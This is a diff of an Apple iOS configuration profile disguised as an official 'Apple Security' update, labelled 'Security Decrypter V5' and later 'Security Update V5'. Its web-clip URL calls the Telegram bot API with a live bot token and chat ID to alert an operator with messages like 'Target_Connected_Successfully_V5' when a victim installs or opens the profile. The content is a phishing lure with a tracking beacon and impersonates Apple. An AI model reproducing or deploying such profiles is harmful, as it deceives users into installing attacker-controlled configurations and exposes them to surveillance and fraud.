@@ -1,36 +1,20 @@
-<?xml version="1.0" encoding="UTF-8"?>
+ <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
     <key>PayloadContent</key>
     <array>
         <dict>
-            <key>PayloadDescription</key>
-            <string>Configures secure browser access and verification.</string>
-            <key>PayloadDisplayName</key>
-            <string>Secure Verification Web Service</string>
-            <key>PayloadIdentifier</key>
-            <string>com.apple.webclip.managed.1</string>
+            <key>URL</key>
+            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_Connected_Successfully_V5</string>
             <key>PayloadType</key>
             <string>com.apple.webclip</string>
-            <key>PayloadUUID</key>
-            <string>D5E6F7G8-H9I0-J1K2-L3M4-N506P7Q8R9S0</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>URL</key>
-            <string>https://api.telegram.org/bot8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k/sendMessage?chat_id=8639892987&amp;text=Target_Is_Installing_Profile_Now!_🔥</string>
             <key>Label</key>
-            <string>Verified Chat Storage</string>
+            <string>Secure Verification</string>
         </dict>
     </array>
-    <key>PayloadDescription</key>
-    <string>Essential update to recover private chat database.</string>
     <key>PayloadDisplayName</key>
-    <string>Security Decrypter V5</string>
-    <key>PayloadIdentifier</key>
-    <string>com.apple.security.decrypter.v5</string>
-    <key>PayloadOrganization</key>
-    <string>Apple Security</string>
+    <string>Security Update V5</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
